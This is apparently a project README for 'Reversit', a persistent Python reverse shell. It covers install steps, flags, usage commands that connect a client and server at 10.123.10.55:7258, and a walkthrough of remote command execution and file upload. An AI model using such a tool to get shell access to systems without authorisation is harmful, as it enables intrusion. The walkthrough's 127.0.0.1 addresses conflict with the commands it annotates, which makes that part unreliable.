# ![Reversit](/img/Reversit.png)
## Persistent Reverse Shell Written in Python 3
## 🔧 Installation
 You will need:
 * Python version 3.10
 * Pip 3 for the client computer
### macOS & Linux
 1. Clone the repository from github: `git clone https://github.com/Brandonli-13/Reversit.git`
 2. Change to Reversit directory: `cd Reversit/`
 3. Make `install` executable: `chmod +x ./install`
 4. Run `./install`: `./install`

## 🔨 Usage
### Flags
 `-h`, `--help`: Display help message
 `-a`, `--address`: Set IP address to connect to (client) / IP address to listen for a connection on (server)<br/>
 `-p`, `--port`: Set port number to connect to (client) / port number to listen for a connection on (server)<br/>
 `-b`, `--buffer`: Set buffer size, default: 131072 (bytes)<br/>
 `-s`, `--separator`: Set separator between type of request and data, default: \<separator\><br/>
 `-l`, `--listen`: Listen for incoming connections<br/>

### Quick Usage
 Server: `reversit -a 10.123.10.55 -p 7258 -b -s -l`
 Client: `reversit -a 10.123.10.55 -p 7258 -b -s`

## 🪛 Features
* When the client side closes connection, the server will keep on listening for another connection
* Ability to change directory
* Upload file

## Contributing
Contributions are welcome. Read [this](https://gist.github.com/MarcDiethelm/7303312#file-contributing-md) before contributing to this program.

## ⚙️ How Reversit Works
1. Server: `reversit -a 10.123.10.55 -p 7258 -b -s -l` <-- Starts listening on 127.0.0.1:7258
2. Client: `reversit -a 10.123.10.55 -p 7258 -b -s` <-- Connects to server on 127.0.0.1:7258
3. Client: `ls` <-- Sends `command<separator>ls` to server
4. Server: Recognizes `command` before separator and executes command
5. Server: Sends command output (stdout) to client
6. Client: Displays output
